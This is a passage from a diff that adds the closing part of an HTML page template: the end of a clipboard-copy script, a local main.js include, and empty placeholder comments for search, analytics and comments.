+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
